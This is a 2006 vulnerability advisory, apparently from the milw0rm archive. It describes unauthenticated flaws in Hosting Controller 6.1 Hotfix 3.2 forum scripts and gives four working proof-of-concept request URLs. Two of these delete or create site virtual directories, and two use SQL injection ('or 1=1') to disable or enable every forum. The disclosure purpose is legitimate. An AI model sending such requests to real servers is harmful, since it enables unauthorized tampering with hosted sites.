@@ -1,0 +1,46 @@
+Hosting Controller 6.1 Hotfix <= 3.2 Multi Vuln.
+
+SQL_Injection, Command Injection
+
+-------
+
+[KAPDA::59] - Hosting Controller 6.1 Hotfix <= 3.2
+Vendor: Hosting Controller
+Vendor URL: www.hostingcontroller.com
+Solution: Hotfix 3.3
+Found Date: 7/1/2006
+Release Date: 10/10/2006
+
+Discussion:
+--------------------
+UnAuthenticated user can
+1- delete every sites virtual directory on hc sites
+2- make forum virtual directory (with the desire name) for everysites on hc!
+3- disable all hc forums by SQL Injection
+4- enable all hc forums by SQL Injection
+
+Bugs are available in "DisableForum.asp" and "enableForum.asp" in forum directory.
+
+Exploit: (or POC)
+--------------------
+1- unAuthenticated user can delete every sites virtual directory on hc sites by forum!
+/forum/HCSpecific/DisableForum.asp?action=disableforum&WSiteName=testsite.com&VDirName=test&ForumID=1
+-----------------------------------------------------------------
+2- unAuthenticated user can make forum virtual directory (with the desire name) for everysites on hc by forum!
+/forum/HCSpecific/EnableForum.asp?action=enableforum&WSiteName=testsite.com&VDirName=test&ForumID=
+-----------------------------------------------------------------
+3- unAuthenticated user can disable all hc forums by SQL_Injection
+/forum/HCSpecific/DisableForum.asp?action=disableforum&ForumID=1 or 1=1
+-----------------------------------------------------------------
+4- unAuthenticated user can enable all hc forums by SQL_Injection
+/forum/HCSpecific/EnableForum.asp?action=enableforum&ForumID=1 or 1=1
+--------------------
+
+Credit :
+--------------------
+Soroush Dalili of Kapda and GSG
+IRSDL [4t} kapda <d0t] ir
+Kapda - Security Science Researchers Insitute [http://www.KAPDA.ir]
+GSG - Grayhatz security group [http://www.Grayhatz.net] 
+
+# milw0rm.com [2006-10-27]
